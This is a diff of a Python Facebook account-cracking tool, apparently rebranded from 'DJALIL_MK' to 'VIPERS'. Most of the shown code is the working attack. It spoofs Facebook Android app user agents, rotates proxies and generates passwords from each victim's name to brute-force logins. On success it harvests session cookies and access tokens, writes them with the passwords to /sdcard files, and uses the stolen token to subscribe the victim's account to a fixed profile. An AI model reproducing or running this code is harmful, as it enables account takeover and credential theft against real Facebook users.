@@ -1,5 +1,5 @@
 #DECODED BY CRIMINAL WITH ICDEC
-# OWNER  DJALIL_MK 
+# OWNER MR VIPERS 
 import os,time,_md5,marshal,inspect,hashlib
 import http.client
 import platform
@@ -64,7 +64,7 @@ import requests
 #gty=len(requests.get(link2).json())
 os.system('clear')
 print(' \033[1;32m[\033[1;31m–\033[1;32m] Join telegram channel  ')
-os.system('xdg-open https://t.me/alg_trimex')
+os.system('xdg-open https://t.me/VIPERStool ')
 
 def dc(encoded_message):
     decoded_message = ''
@@ -155,7 +155,7 @@ try:
 except ModuleNotFoundError: 
     print('\n Installing missing modules ...')
     os.system('pip install requests bs4 futures==2 > /dev/null')
-    os.system('python DJALIL_MK.py')
+    os.system('python VIPERS.py')
 
 #------------------[  Ua  ]-------------------#  
 def ua1():
@@ -163,14 +163,14 @@ def ua1():
     alex9 = str(random.randint(200,400))+".0.0."+str(random.randint(7,37))+"."+str(random.randint(101,151))
     alex2 = random.randint(410000000,499999999)
     cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])  
-    ua = 'Dalvik/2.1.0 (Linux; U; Android 14.5.0; CPH2207 Build/OPR6.101106.028) [FBAN/FB4A;FBAV/392.0.0.32.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/318413147;FBCR/MetroPCS;FBMF/OPPO;FBBD/oppo;FBDV/CPH2207;FBSV/14.5.0;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.8,width=1345,height=1023};FB_FW/1;FBRV/318805181;]' + \
-'Dalvik/2.1.0 (Linux; U; Android 12.6.2; SM-J105F Build/PD2A.180728.025) [FBAN/FB4A;FBAV/391.1.0.37.104;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/318217130;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.6.2;FBCA/arm64-v8a:;FBDM/{density=3.0,width=536,height=1820};FB_FW/1;]' + \
-'Dalvik/2.1.0 (Linux; U; Android 5.5.2; V17 Pro Build/PPR1.200306.029) [FBAN/FB4A;FBAV/31.0.0.0.0;FBPN/com.facebook.katana;FBLC/en_US;FBBV/7930627;FBCR/Verizon;FBMF/Vivo;FBBD/vivo;FBDV/V17 Pro;FBSV/5.5.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.75,width=774,height=2521};FB_FW/1;] FBBK/1]' + \
-'Dalvik/2.1.0 (Linux; U; Android 9.7.0; Y69 Build/PPR2.180202.010) [FBAN/FB4A;FBAV/139.0.0.26.93;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/70506848;FBCR/Smartmobil;FBMF/Vivo;FBBD/vivo;FBDV/Y69;FBSV/9.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.875,width=783,height=733};FB_FW/1;FBRV/70645913;]' + \
-'Dalvik/2.1.0 (Linux; U; Android 15.6.1; SM-J200F Build/QD4A.130310.058) [FBAN/FB4A;FBAV/465.0.0.0.6;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/452000754;FBCR/Telstra;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/15.6.1;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.278,width=684,height=1221};]' + \
-'Dalvik/2.1.0 (Linux; U; Android 11.6.2; SM-J200F Build/SD2A.201009.016) [FBAN/FB4A;FBAV/156.0.0.36.100;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/88997456;FBCR/Fido Solutions;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/11.6.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=641,height=1134};]' + \
-'Dalvik/2.1.0 (Linux; U; Android 7.8.4; GRA-L09 Build/SQ3A.070113.003) [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=879,height=1032};FBLC/en_CA;FBRV/20156271;FB_FW/2;FBCR/Fido Solutions;FBMF/Huawei;FBBD/huawei;FBPN/com.facebook.katana;FBDV/GRA-L09;FBSV/7.8.4;FBOP/19;FBCA/arm64-v8a:;]' + \
-'Dalvik/2.1.0 (Linux; U; Android 12.8.0; SM-G530F Build/RQ3A.110801.033) [FBAN/FB4A;FBAV/349.0.0.39.470;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/309853966;FBCR/Penny Mobil;FBMF/Samsung;FBBD/samsung;FBDV/SM-G530F;FBSV/12.8.0;FBCA/x86_64:arm64-v8a:armeabi-v7a;FBDM/{density=1.25,width=876,height=2323};FB_FW/1;FBRV/310203023;] FBBK/1]'
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 15.5.4; SM-A700F Build/RQ3A.160106.067) [FBAN/FB4A;FBAV/464.0.0.0.55;FBBV/451805674;FBDM/{density=1.8,width=1177,height=986};FBLC/en_CA;FBRV/452269761;FB_FW/2;FBCR/Bell Mobility;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A700F;FBSV/15.5.4;FBOP/20;FBCA/x86:armeabi-v7a;]' + \
+'Dalvik/2.1.0 (Linux; U; Android 15.7.4; SM-J701F Build/SP2A.110804.041) [FBAN/FB4A;FBAV/363.0.0.30.112;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/312616128;FBCR/Airtime Mobile;FBMF/Samsung;FBBD/samsung;FBDV/SM-J701F;FBSV/15.7.4;FBCA/x86:arm64-v8a:armeabi-v7a;FBDM/{density=3.8,width=1342,height=1682};FB_FW/1;FBRV/312979156;]' + \
+'Dalvik/2.1.0 (Linux; U; Android 13.8.3; SM-M426B Build/PD2A.200821.019) [FBAN/FB4A;FBAV/349.0.0.39.470;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/309853966;FBCR/Congstar Prepaid;FBMF/Samsung;FBBD/samsung;FBDV/SM-M426B;FBSV/13.8.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=892,height=747};]' + \
+'Dalvik/2.1.0 (Linux; U; Android 11.8.3; SM-A507F Build/RP1A.070215.025) [FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966513;FBDM/{density=4.0,width=1306,height=2412};FBLC/en_AU;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A507F;FBSV/11.8.3;FBCA/x86_64:x86:arm64-v8a;]' + \
+'Dalvik/2.1.0 (Linux; U; Android 15.7.0; SM-J400F Build/TD4A.180226.032) [FBAN/FB4A;FBAV/364.1.0.25.132;FBBV/312816921;FBDM/{density=2.2,width=784,height=815};FBLC/fr_CA;FBRV/313180995;FB_FW/2;FBCR/Telus Mobilité;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J400F;FBSV/15.7.0;FBOP/20;FBCA/x86_64:arm64-v8a:armeabi-v7a;]' + \
+'Dalvik/2.1.0 (Linux; U; Android 15.7.4; SM-G965F Build/TQ3A.190304.062) [FBAN/FB4A;FBAV/409.0.0.27.106;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/440813707;FBCR/PENNYmobil Prepaid;FBMF/Samsung;FBBD/samsung;FBDV/SM-G965F;FBSV/15.7.4;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=2.375,width=1308,height=2263};FB_FW/1;]' + \
+'Dalvik/2.1.0 (Linux; U; Android 14.6.3; SM-A205F Build/TP1A.230314.047) [FBAN/FB4A;FBAV/394.0.0.50.107;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/318819784;FBCR/Telus Mobility;FBMF/Samsung;FBBD/samsung;FBDV/SM-A205F;FBSV/14.6.3;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.25,width=843,height=1519};]' + \
+'Dalvik/2.1.0 (Linux; U; Android 13.5.4; SM-A507F Build/SD2A.110811.062) [FBAN/FB4A;FBAV/361.0.0.39.115;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/312217351;FBCR/7-Eleven SpeakOut Wireless;FBMF/Samsung;FBBD/samsung;FBDV/SM-A507F;FBSV/13.5.4;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=2.125,width=638,height=1397};FB_FW/1;]'
     return ua
 #Dalvik/2.1.0 (Linux; U; Android 14; SM-S926B Build/UP1A.240106.001) [FBAN/FB4A;FBAV/474.9.19.29.929;FBBV/4740919822;FBDM/{density=3.72,width=1440,height=3125};FBLC/ar_SA;FBRV/4740919822;FBCR/Mobily;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S926B;FBSV/14;FBOP/1;FBCA/arm64-v8a;]
 #------------------[ Finished User Agent ]-------------------#
@@ -187,8 +187,7 @@ os.system('pip install requests')
 os.system('pip install mechanize')
 os.system('pip install bs4 httpx')
 os.system('clear')
-print('\x1b[38;5;46m WELCOME TO DJALIL_MK') 
-print("WORLD") 
+print('             \x1b[38;5;46m WELCOME TO VIPERS WORLD          ')
 import os
 import requests
 
@@ -223,9 +222,9 @@ boos = random.choice([P,M,H,K,B,U,O,N,R])
 orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
 abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
 my_color = [white,blue,green];warna = random.choice(my_color)
-#os.system('xdg-open https://www.youtube.com/@DJALIL_MKms16')
+#os.system('xdg-open https://www.youtube.com/@VIPERSms16')
 #os.system(f'xdg-open https://chat.whatsapp.com/LcGBrnPS2KC3b1p7GFJqa4')
-sys.stdout.write('\x1b]2; DJALIL >M1 \x07')
+sys.stdout.write('\x1b]2; VIP-VIPERS > M1 \x07')
 
 #------------------[  sim id  ]-------------------#        
 sim_id = ''
@@ -302,25 +301,24 @@ def Trial(PF):
     
 TrialExist=""
 logo=(f"""\033[1;37m
-\033[1;91m███╗   ██╗\033[0m \033[1;95m██╗\033[0m \033[1;94m███████╗\033[0m \033[1;96m ██████╗ \033[0m \033[1;92m███████╗\033[0m
-\033[1;91m████╗  ██║\033[0m \033[1;95m██║\033[0m \033[1;94m██╔════╝\033[0m \033[1;96m██╔═══██╗\033[0m \033[1;92m██╔════╝\033[0m
-\033[1;91m██╔██╗ ██║\033[0m \033[1;95m██║\033[0m \033[1;94m███████╗\033[0m \033[1;96m██║   ██║\033[0m \033[1;92m█████╗  \033[0m
-\033[1;91m██║╚██╗██║\033[0m \033[1;95m██║\033[0m \033[1;94m╚════██║\033[0m \033[1;96m██║   ██║\033[0m \033[1;92m██╔══╝  \033[0m
-\033[1;91m██║ ╚████║\033[0m \033[1;95m██║\033[0m \033[1;94m███████║\033[0m \033[1;96m╚██████╔╝\033[0m \033[1;92m███████╗\033[0m
-\033[1;91m╚═╝  ╚═══╝\033[0m \033[1;95m╚═╝\033[0m \033[1;94m╚══════╝\033[0m \033[1;96m ╚═════╝ \033[0m \033[1;92m╚══════╝\033[0m
-
-\033[1;93m      N  I  S  O  E\033[0m
-─────────────────────────────────────────────  
-\033[1;37m[–] BEST ALGRIA CRACK DJALIL WORLD 🦅  
+{gas} \033[1;37m██    ██ ██ ██████  ███████ ██████  ███████   
+{gas} \033[1;37m██    ██ ██ ██   ██ ██      ██   ██ ██        
+{gas} \033[1;37m██    ██ ██ ██████  █████   ██████  ███████   
+{gas} \033[1;37m ██  ██  ██ ██      ██      ██   ██      ██   
+{gas} \033[1;37m  ████   ██ ██      ███████ ██   ██ ███████  
 \033[1;37m─────────────────────────────────────────────  
-\033[1;31m [-] FACEBOOK : DJALIL MK
-\033[1;32m [-] TELEGRAM : djalil_dz_48
-\033[1;36m [–] AUTHOR   : MR-DJALIL
-\033[1;34m [–] SERVICE  : {rrrrrrrr}FREE\033[0m
+\033[1;37m[–] AUTHOR   : VIP-CRIMINAL  
+\033[1;37m[–] FACEBOOK : CRIMINAL   
+\033[1;37m[–] GITHUB   : CRIMINAL_05  
+\033[1;37m─────────────────────────────────────────────  
+\033[1;37m[–] BEST ALGRIA CRACK  VIPRES WORLD 🗽  
+\033[1;37m─────────────────────────────────────────────  
+\033[1;37m[–] VERSION : {5.0}  
+\033[1;37m[–] SERVICE : {rrrrrrrr}PAID \033[0m
 \033[1;37m─────────────────────────────────────────────""")
 # I love you Mom 
 def dino():
-    print('\033[1;37m─────────────────────────────────────────────')[]
+    print('\033[1;37m─────────────────────────────────────────────')
 
 def linex():
     print('\033[1;37m─────────────────────────────────────────────')
@@ -368,7 +366,7 @@ try:
 except Exception as e:
     pass
     carrier = None
-#------------------[ MENU DJALIL_MK  ]-------------------#
+#------------------[ MENU VIPERS  ]-------------------#
 def menu():
             clear()        
             print(' \033[1;37m[\033[1;31m1\033[1;32m] CRACK FILE ')
@@ -378,7 +376,7 @@ def menu():
             xd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
             if xd in ['1','01']:
                 clear()
-                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/DJALIL_MK.txt')
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/VIPERS.txt')
                 dino()
                 file = input(' \033[1;32m[\033[1;31m–\033[1;32m] ENTER FILE PATH\033[1;32m : ')
                 try:
@@ -461,11 +459,11 @@ def menu():
                 print('\033[1;32m[\033[1;31m–\033[1;32m] OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                 dino()
                 input(' Press enter to back ')
-                os.system('python DJALIL_MK.py') 
+                os.system('python VIPERS.py') 
             elif xd in ['0','00']:
                 exit(' Thanls For Your Use ')
             elif xd in ['2','02']:
-                os.system('xdg-open https://www.facebook.com/DJALIL_MKm1')     
+                os.system('xdg-open https://www.facebook.com/VIPERSm1')     
             else:
                 exit(' Option not found in menu...')
 
@@ -474,7 +472,7 @@ def M_file_1(ids,names,passlist):
                 try:
                         global ok, loop
                         boos = random.choice([P, M, H, K, B, U, O, N])
-                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
+                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-VIPERS\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                         sys.stdout.flush()
                         
                         fn = names.split(' ')[0]
@@ -485,7 +483,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a = "[FBAN/FB4A;FBAV/392.0.0.32.108;FBBV/318413147;[FBAN/FB4A;FBAV/392.0.0.32.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/318413147;FBCR/MetroPCS;FBMF/OPPO;FBBD/oppo;FBDV/CPH2207;FBSV/14.5.0;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.8,width=1345,height=1023};FB_FW/1;FBRV/318805181;]"+"[FBAN/FB4A;FBAV/391.1.0.37.104;FBBV/318217130;[FBAN/FB4A;FBAV/391.1.0.37.104;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/318217130;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.6.2;FBCA/arm64-v8a:;FBDM/{density=3.0,width=536,height=1820};FB_FW/1;]"+"[FBAN/FB4A;FBAV/31.0.0.0.0;FBBV/7930627;[FBAN/FB4A;FBAV/31.0.0.0.0;FBPN/com.facebook.katana;FBLC/en_US;FBBV/7930627;FBCR/Verizon;FBMF/Vivo;FBBD/vivo;FBDV/V17 Pro;FBSV/5.5.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.75,width=774,height=2521};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/139.0.0.26.93;FBBV/70506848;[FBAN/FB4A;FBAV/139.0.0.26.93;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/70506848;FBCR/Smartmobil;FBMF/Vivo;FBBD/vivo;FBDV/Y69;FBSV/9.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.875,width=783,height=733};FB_FW/1;FBRV/70645913;]"+"[FBAN/FB4A;FBAV/465.0.0.0.6;FBBV/452000754;[FBAN/FB4A;FBAV/465.0.0.0.6;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/452000754;FBCR/Telstra;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/15.6.1;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.278,width=684,height=1221};]"+"[FBAN/FB4A;FBAV/174.0.0.54.96;FBBV/111133949;[FBAN/FB4A;FBAV/174.0.0.54.96;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/111133949;FBCR/NettoKOM;FBMF/OPPO;FBBD/oppo;FBDV/CPH1602;FBSV/11.7.4;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.5,width=443,height=2323};]"+"[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/308616431;[FBAN/FB4A;FBAV/343.0.0.37.117;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/308616431;FBCR/Vodafone UK;FBMF/OPPO;FBBD/oppo;FBDV/CPH1931;FBSV/14.5.1;FBCA/x86:arm64-v8a:armeabi-v7a;FBDM/{density=1.5,width=689,height=2482};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/138.0.0.19.93;FBBV/69169467;[FBAN/FB4A;FBAV/138.0.0.19.93;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/69169467;FBCR/Boost Mobile;FBMF/Sony;FBBD/sony;FBDV/XQ-CC52;FBSV/9.8.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.9,width=1435,height=2415};FB_FW/1;FBRV/69307490;] FBBK/1]"+"[FBAN/FB4A;FBAV/184.0.0.41.79;FBBV/119894354;[FBAN/FB4A;FBAV/184.0.0.41.79;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/119894354;FBCR/Coles Mobile;FBMF/OPPO;FBBD/oppo;FBDV/CPH1607;FBSV/8.9.2;FBCA/arm64-v8a:;FBDM/{density=2.8,width=868,height=1190};FB_FW/1;FBRV/120078453;]"+"[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;FBDM/{density=2.2,width=545,height=753};FBLC/en_US;FBRV/156872539;FB_FW/2;FBCR/Visible;FBMF/Vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Y30e;FBSV/9.8.0;FBOP/20;FBCA/x86:arm64-v8a:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/311215741;[FBAN/FB4A;FBAV/356.0.0.28.112;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/311215741;FBCR/SaskTel;FBMF/OPPO;FBBD/oppo;FBDV/CPH1845;FBSV/12.8.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.875,width=1253,height=1834};]"+"[FBAN/FB4A;FBAV/407.0.0.30.97;FBBV/440412261;[FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/440412261;FBCR/TPG Telecom;FBMF/Vivo;FBBD/vivo;FBDV/V5;FBSV/12.6.1;FBCA/x86_64:armeabi-v7a;FBDM/{density=2.8,width=709,height=1043};FB_FW/1;]"
+                                u1a = "Dalvik/2.1.0 (Linux; U; Android 11.5.1; SM-A217F Build/OPR6.150708.003) [FBAN/FB4A;FBAV/189.0.0.35.91;FBBV/123791219;FBDM/{density=2.25,width=1384,height=752};FBLC/en_CA;FBRV/123980290;FB_FW/2;FBCR/PC Mobile;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217F;FBSV/11.5.1;FBOP/1;FBCA/x86_64:x86:arm64-v8a;]"+"Dalvik/2.1.0 (Linux; U; Android 15.8.5; SM-M315F Build/QD4A.080426.032) [FBAN/FB4A;FBAV/474.0.0.52.74;FBBV/453811755;FBDM/{density=2.29375,width=784,height=1056};FBLC/de_DE;FBRV/454285756;FB_FW/2;FBCR/PENNYmobil Prepaid;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M315F;FBSV/15.8.5;FBOP/1;FBCA/arm64-v8a:;]"+"Dalvik/2.1.0 (Linux; U; Android 14.9.4; SM-A530F Build/TD4A.090320.013) [FBAN/FB4A;FBAV/374.0.0.20.109;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/314813437;FBCR/Telus Mobility;FBMF/Samsung;FBBD/samsung;FBDV/SM-A530F;FBSV/14.9.4;FBCA/x86:armeabi-v7a;FBDM/{density=3.8,width=861,height=1369};]"+"Dalvik/2.1.0 (Linux; U; Android 13.5.3; SM-M217F Build/RP1A.131009.009) [FBAN/FB4A;FBAV/397.0.0.23.404;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/420441389;FBCR/Utility Warehouse;FBMF/Samsung;FBBD/samsung;FBDV/SM-M217F;FBSV/13.5.3;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width=929,height=1211};]"+"Dalvik/2.1.0 (Linux; U; Android 11.7.5; SM-A536B Build/RP1A.150220.001) [FBAN/FB4A;FBAV/220.0.0.46.112;FBPN/com.facebook.katana;FBLC/en_US;FBBV/153408057;FBCR/Sprint;FBMF/Samsung;FBBD/samsung;FBDV/SM-A536B;FBSV/11.7.5;FBCA/arm64-v8a:;FBDM/{density=3.8,width=1148,height=1745};]"+"Dalvik/2.1.0 (Linux; U; Android 12.9.0; SM-J701F Build/QP1A.080526.053) [FBAN/FB4A;FBAV/404.0.0.35.70;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/421812321;FBCR/O2 Prepaid;FBMF/Samsung;FBBD/samsung;FBDV/SM-J701F;FBSV/12.9.0;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.5,width=641,height=1825};FB_FW/1;FBRV/422216381;]"+"Dalvik/2.1.0 (Linux; U; Android 15.8.2; SM-J730F Build/SP2A.130521.004) [FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/283621019;FBDM/{density=2.75,width=596,height=1035};FBLC/en_GB;FBRV/283939031;FB_FW/2;FBCR/Sky Mobile;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J730F;FBSV/15.8.2;FBOP/1;FBCA/x86_64:x86:arm64-v8a;]"+"Dalvik/2.1.0 (Linux; U; Android 14.7.1; SM-J610F Build/SP1A.230814.048) [FBAN/FB4A;FBAV/485.0.0.0.51;FBBV/456005032;FBDM/{density=1.875,width=1269,height=1582};FBLC/en_US;FBRV/456490113;FB_FW/2;FBCR/Consumer Cellular;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J610F;FBSV/14.7.1;FBOP/19;FBCA/x86:arm64-v8a:armeabi-v7a;]"+"Dalvik/2.1.0 (Linux; U; Android 11.5.1; SM-J701F Build/RP1A.150523.058) [FBAN/FB4A;FBAV/292.0.0.60.123;FBBV/250937654;FBDM/{density=1.8,width=886,height=1830};FBLC/en_GB;FBRV/251229731;FB_FW/2;FBCR/Daisy Group;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J701F;FBSV/11.5.1;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"+"Dalvik/2.1.0 (Linux; U; Android 14.9.5; SM-A500F Build/PQ3B.120723.055) [FBAN/FB4A;FBAV/465.0.0.60.83;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/452016700;FBCR/Vidéotron;FBMF/Samsung;FBBD/samsung;FBDV/SM-A500F;FBSV/14.9.5;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.875,width=1123,height=1908};]"+"Dalvik/2.1.0 (Linux; U; Android 13.6.0; SM-A307F Build/QD4A.160624.053) [FBAN/FB4A;FBAV/485.0.0.0.51;FBBV/456005032;FBDM/{density=2.5,width=668,height=781};FBLC/de_DE;FBRV/456490084;FB_FW/2;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307F;FBSV/13.6.0;FBOP/19;FBCA/x86_64:x86:armeabi-v7a;]"+"Dalvik/2.1.0 (Linux; U; Android 12.6.0; SM-A307F Build/RP1A.210509.050) [FBAN/FB4A;FBAV/392.2.0.33.108;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/318413506;FBCR/Tbaytel;FBMF/Samsung;FBBD/samsung;FBDV/SM-A307F;FBSV/12.6.0;FBCA/arm64-v8a:null;FBDM/{density=2.25,width=619,height=1169};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 15.6.5; GT-I9200 Build/SQ3A.221208.022) [FBAN/FB4A;FBAV/409.0.0.27.106;FBPN/com.facebook.katana;FBLC/en_US;FBBV/440813707;FBCR/Republic Wireless;FBMF/Samsung;FBBD/samsung;FBDV/GT-I9200;FBSV/15.6.5;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=2.8,width=1302,height=1554};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 14.5.0; SM-E236B Build/PQ3B.070222.024) [FBAN/FB4A;FBAV/362.0.0.27.109;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/312415283;FBCR/GoSmart Mobile;FBMF/Samsung;FBBD/samsung;FBDV/SM-E236B;FBSV/14.5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.75,width=1109,height=1989};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 12.7.2; SM-J105F Build/PPR2.130916.060) [FBAN/FB4A;FBAV/484.0.0.0.50;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/455803383;FBCR/Three 5G Home;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.7.2;FBCA/x86_64:arm64-v8a:armeabi-v7a;FBDM/{density=3.0,width=782,height=2138};FB_FW/1;FBRV/456287479;]"+"Dalvik/2.1.0 (Linux; U; Android 15.8.1; GT-I9200 Build/TP2A.110422.026) [FBAN/FB4A;FBAV/458.0.0.38.86;FBBV/450614458;FBDM/{density=1.278,width=540,height=2348};FBLC/en_AU;FBCR/Exetel;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9200;FBSV/15.8.1;FBCA/x86_64:arm64-v8a:armeabi-v7a;]"+"Dalvik/2.1.0 (Linux; U; Android 12.8.0; SM-N930F Build/PPR1.070928.008) [FBAN/FB4A;FBAV/342.0.0.37.119;FBBV/308417363;FBDM/{density=1.0,width=536,height=2358};FBLC/en_CA;FBRV/308759410;FB_FW/2;FBCR/Rogers Wireless;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N930F;FBSV/12.8.0;FBOP/1;FBCA/x86:armeabi-v7a;]"+"Dalvik/2.1.0 (Linux; U; Android 12.9.3; SM-M307F Build/RP1A.100327.059) [FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/313613498;FBDM/{density=1.625,width=1367,height=1373};FBLC/de_DE;FBRV/313981566;FB_FW/2;FBCR/Congstar Prepaid;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M307F;FBSV/12.9.3;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
@@ -520,30 +518,30 @@ def M_file_1(ids,names,passlist):
                                 
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
-                                        print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        print('\r\x1b[1;92m<[VIPERS-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                         print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
                                         token = q['access_token']
                                         requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
-                                        open('/sdcard/DJALIL_MK_m1_OK.txt', 'a').write(ids + '|' + pas + '\n')
-                                        open('/sdcard/DJALIL_MKDJALIL_MK_iDs_COOKiE_M1.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
+                                        open('/sdcard/VIPERS_m1_OK.txt', 'a').write(ids + '|' + pas + '\n')
+                                        open('/sdcard/VIPERS_iDs_COOKiE_M1.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                                         oks.append(ids)
                                         break
                                         
